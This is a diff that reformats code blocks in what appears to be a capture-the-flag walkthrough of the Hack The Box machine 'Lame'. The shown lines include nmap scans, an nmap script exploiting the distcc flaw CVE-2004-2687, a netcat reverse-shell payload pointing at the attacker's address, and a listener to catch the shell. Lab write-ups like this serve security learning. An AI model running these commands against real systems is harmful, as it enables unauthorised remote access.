@@ -13,7 +13,8 @@ Starting off with an nmap scan to check which ports are open:
 3. 139, 445 - smb (netbios)
 
 After doing a full port scan using:
-`nmap -sC -sV -oA nmap/lamefull 10.10.10.3 --max-retries 0`, we get:
+
+    nmap -sC -sV -oA nmap/lamefull 10.10.10.3 --max-retries 0, we get:
 
 
 ![nmap scan](/assets/Lamenmap.png)
@@ -36,15 +37,17 @@ There is an nmap script avaiable for this and you can find it here:
 ### Exploitation
 
 Using the nmap script:
-`sudo nmap -p 3632 10.10.10.3 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd=cmd"`
+    
+    sudo nmap -p 3632 10.10.10.3 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd=cmd"
 
 Putting out reverse shell payload in place of the cmd argument:
 cmd = `/bin/nc -e /bin/sh 10.10.14.9 4445`
 
 Setting up a Netcat listener on our attack machine to catch the shell:
-`sudo nc -nlvp 4445`
+    
+    sudo nc -nlvp 4445
 
-    After executing nmap script, we have successfully got a Reverse shell:
+After executing nmap script, we have successfully got a Reverse shell:
 
 ![lame rev shell](/assets/lamerevshell.png)
 
